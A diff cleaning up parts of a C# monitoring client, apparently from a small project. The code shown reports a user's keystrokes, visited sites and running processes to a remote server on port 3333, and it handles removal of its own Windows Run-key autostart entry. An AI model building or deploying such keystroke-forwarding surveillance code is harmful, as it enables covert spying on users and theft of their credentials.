@@ -162,13 +162,11 @@ namespace ClientSide
                 using (var stream = client.OpenRead("http://www.google.com"))
                 {
                     return true;
-
                 }
             }
             catch
             {
                 // send client not internet
-
                 return false;
             }
 
@@ -234,16 +232,11 @@ namespace ClientSide
                         string setting = dataFromServer[1].Split('\0')[0];
                         setting = setting.Substring(setting.IndexOf("\n") + 1);
 
-                        // save setting 
-                         
+                        // save setting                          
                         DBInstance.fillGeneralDetailsTable("name", name);
                         DBInstance.fillGeneralDetailsTable("ip", ip);
                         DBInstance.fillGeneralDetailsTable("setting", setting);
                         playAllTrigers(); //This method obtains the settings string from the server  
-
-                        // Set Periodic Report 
-                        // PeriodicReporting.setReportPeriodic();  
-
                         break;
 
                     // Launch the software in live reporting mode
@@ -253,7 +246,6 @@ namespace ClientSide
 
                     // Stop live reporting mode 
                     case STOP_LIVE:
-                        // ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");  
                         stopLiveMode(clientSocket);
                         break;
 
@@ -269,7 +261,6 @@ namespace ClientSide
                         break;
 
                     default:
-                        // ShowErrorDialog("server send: |" + dataFromServer[0].Split('\0')[0] + "|");
                         break;
                 }
 
@@ -279,7 +270,6 @@ namespace ClientSide
 
             catch (SocketException ex)
             {
-                //ShowErrorDialog("ReceiveCallback\n" + ex );
                 Console.WriteLine("ReceiveCallback SocketException - RECONNECT");
                 reConnect();
             }
@@ -293,8 +283,7 @@ namespace ClientSide
         private void sendLastReport(Socket socket)
         {
 
-            string lastReport = PeriodicReporting.getReportString();
-             
+            string lastReport = PeriodicReporting.getReportString();     
             Console.WriteLine("last reort is: " + lastReport);
             SendData(socket, "check connection before send last report\r");
             SendData(socket, "last report\r" + lastReport);
@@ -302,8 +291,6 @@ namespace ClientSide
         // sara 
         private void removeClient()
         { 
-           // ShowErrorDialog("removeeeeeeeeeeee");
-            
             // turn off all theards 
             manageMonitor.stopAllTriggers();
            
@@ -316,7 +303,7 @@ namespace ClientSide
                      
             // restart - delete key 
             RegistryKey rkApp = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", true);
-             rkApp.DeleteValue("ClientSide.exe", false);
+            rkApp.DeleteValue("ClientSide.exe", false);
 
             System.Environment.Exit(0);
 
@@ -329,15 +316,12 @@ namespace ClientSide
         {
 
             sendCurrentData = false;
-            // monitorProccess.ifLive = false; 
-            // ShowErrorDialog("stop send current state");   
             manageMonitor.stopLiveMode();
         }
 
         private void liveMode(Socket socket)
         {
             sendCurrentData = true;
-            //SendData(socket, "open live form\r");
             SendData(socket, "current state\ropen CurrentState form");
             manageMonitor.playLiveMode();
 
@@ -380,21 +364,12 @@ namespace ClientSide
                 clientSocket.EndConnect(AR);
                 clientSocket.BeginReceive(buffer, 0, buffer.Length, SocketFlags.None, ReceiveCallback, clientSocket);
 
-                // ShowErrorDialog("in ConnectCallback in socket: " + clientSocket.RemoteEndPoint);
-
                 if (id != null)
                 {
                     SendData(clientSocket, "id\r" + id);
                 }
                    
                 else SendData(clientSocket, "name\r" + name);
-
-                // play thread to check connection to server socket
-                //if (checkConnection)
-                //{
-                //    checkConnection = false;                    
-                //}
-
 
             }
             catch (SocketException ex)
@@ -439,8 +414,7 @@ namespace ClientSide
 
         public static void ShowErrorDialog(string message)
         {
-           // MessageBox.Show(message, Application.ProductName, MessageBoxButtons.OK, MessageBoxIcon.Error);
-              Console.WriteLine(message);
+            Console.WriteLine(message);
         }
 
 
@@ -532,7 +506,6 @@ namespace ClientSide
  
             try
             {
-                //if (CheckConnection(clientSocket)) 
                 if(clientSocket!=null)
                 {
                      
@@ -544,7 +517,6 @@ namespace ClientSide
                     string crypto = Crypto.Encrypt(data);
                     string decrypto = Crypto.Decrypt(crypto);
                     Console.WriteLine(crypto +"\n"+decrypto+"\n"+ crypto.Length);
-                    //ShowErrorDialog("Send: "+ crypto);
                     var sendData = Encoding.UTF8.GetBytes(crypto);
                     clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
                     return true;
@@ -553,7 +525,6 @@ namespace ClientSide
                 }
                 else {
                     Console.WriteLine("send data fail, socket disconnection");
-                    // reConnect();
                     SendData(clientSocket, data);
                    
                 }
@@ -593,7 +564,6 @@ namespace ClientSide
             Console.ReadLine();
 
 
-            //IEnumerable<string> subData = Enumerable.Range(0, message.Length/300).Select(i => message.Substring(i * 300, 300));
              
             for (int i=0; i<subData.Count();i++) 
             {
@@ -618,63 +588,7 @@ namespace ClientSide
         }
 
 
-        //public void sendDataByParts(Socket clientSocket, string data)
-        //{
-        //    string subject = data.Split(new[] { '\r'}, 2)[0];
-        //    string testData = data.Split(new[] { '\r' }, 2).Last();
-        //    var sendData = Encoding.UTF8.GetBytes("start send data by parts\r" + subject + "\r");
-        //    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
-
-
-        //    string subData = "";
-        //    string subEncrypt = "";
-        //    int index = 0;
-        //    int length = 20;
-
-        //    bool lastPart = false;
-        //    while (!lastPart)
-        //    {
-
-        //        if ((index + length) > testData.Length)
-        //        {
-        //            length = testData.Length;
-        //            subData += testData.Substring(index, length);
-        //            lastPart = true;
-        //        }
-        //        else
-        //        {
-        //            subData += testData.Substring(index, index + length);
-        //        }
-
-
-        //        Byte[] subStringByte = Encoding.UTF8.GetBytes(testData);
-
-        //        subEncrypt = Crypto.Encryption(subData);
-        //        if (subEncrypt != string.Empty)
-        //        {
-        //            DBclient DBInstance = DBclient.Instance;
-        //            string id = DBInstance.getGeneralDetailsTable("id");
-
-        //            sendData = Encoding.UTF8.GetBytes("sub encrypt data\r" + id + "\r" + subEncrypt);
-        //            clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
-        //            index += length;
-        //            length += 20;
-        //        }
-
-
-
-        //    } 
-
-
-        //    sendData = Encoding.UTF8.GetBytes("stop send data by parts\r" + id + "\r");
-        //    clientSocket.BeginSend(sendData, 0, sendData.Length, SocketFlags.None, SendCallback, clientSocket);
-
-
-        //}
-
-
-
-        public void reConnect()
+       public void reConnect()
         {
             try
             {
@@ -686,7 +600,6 @@ namespace ClientSide
                 clientSocket = new Socket(AddressFamily.InterNetwork, SocketType.Stream, ProtocolType.Tcp);
                 buffer = new byte[clientSocket.ReceiveBufferSize];
 
-                //ShowErrorDialog("reConnect in socket: " + clientSocket.RemoteEndPoint);
                 // Connect To Server 
                 IPEndPoint endPoint = new IPEndPoint(IPAddress.Parse(ip), 3333);
                 // The function ConnectCallback set callback to receive and send 
@@ -718,30 +631,17 @@ namespace ClientSide
 
         public static void updateCurrentKeylogger(string word)
         {
-
-            //ShowErrorDialog(word);
             program.SendData(program.clientSocket, "current state\rkeyBoard\r" + word);
-
-
         }
 
         public static void updateCurrentSite(string site)
         {
-            // ShowErrorDialog("send site: \n"+site);
-            //Console.WriteLine(site); 
             program.SendData(program.clientSocket, "current state\rsite\r" + site);
-
-
-
         }
 
         public static void updateCurrentProcess(string proccess)
         {
-            // ShowErrorDialog("send proc: \n" + proccess);
-            program.SendData(program.clientSocket, "current state\rprocesses\r" + proccess);
-
-
-
+           program.SendData(program.clientSocket, "current state\rprocesses\r" + proccess);
         }
 
 
